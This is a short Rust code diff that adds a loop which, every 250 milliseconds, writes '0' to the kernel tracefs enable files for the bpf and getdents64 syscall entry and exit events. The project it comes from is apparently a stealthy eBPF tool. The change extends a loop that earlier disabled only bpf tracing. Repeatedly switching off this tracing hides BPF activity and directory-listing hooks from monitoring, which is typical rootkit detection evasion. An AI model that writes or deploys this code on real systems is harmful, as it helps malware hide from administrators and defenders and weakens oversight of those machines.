@@ -151,18 +151,19 @@ async fn main() -> anyhow::Result<()> {
     thread::spawn({
         move || loop {
             thread::sleep(Duration::from_millis(250));
-            if let Err(err) = write_to_tracefs(
-                "0",
-                "/sys/kernel/debug/tracing/events/syscalls/sys_enter_bpf/enable",
-            ) {
-                println!("error: {}", err);
-            };
-            if let Err(err) = write_to_tracefs(
-                "0",
-                "/sys/kernel/debug/tracing/events/syscalls/sys_exit_bpf/enable",
-            ) {
-                println!("error: {}", err);
-            };
+            for syscall in ["bpf", "getdents64"] {
+                for hook in ["enter", "exit"] {
+                    if let Err(err) = write_to_tracefs(
+                        "0",
+                        &format!(
+                            "/sys/kernel/debug/tracing/events/syscalls/sys_{}_{}/enable",
+                            hook, syscall
+                        ),
+                    ) {
+                        println!("error: {}", err);
+                    };
+                }
+            }
         }
     });
     let ctrl_c = signal::ctrl_c();
